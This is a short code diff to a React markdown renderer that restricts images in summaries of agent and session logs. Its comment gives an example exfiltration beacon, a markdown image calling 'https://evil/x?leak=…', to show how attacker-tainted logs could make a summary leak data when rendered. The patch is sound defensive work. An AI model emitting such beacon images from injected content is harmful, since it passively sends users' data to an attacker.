@@ -53,6 +53,17 @@ const components = {
       </a>
     )
   },
+  // Sentry summarizes content it read from agent/session logs, which may be
+  // attacker-tainted. An unrestricted <img> is fetched automatically on render,
+  // turning `![](https://evil/x?leak=…)` into a passive exfiltration beacon
+  // (no click needed). Only render same-safety https images; anything else
+  // (http, data:, protocol-relative, relative) falls back to inert alt text (#237).
+  img({ src, alt }) {
+    if (typeof src === 'string' && /^https:\/\//i.test(src)) {
+      return <img src={src} alt={alt || ''} className="max-w-full rounded-sm my-1" />
+    }
+    return <span className="text-gray-500 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
+  },
   table({ children }) {
     return (
       <div className="overflow-x-auto my-2">
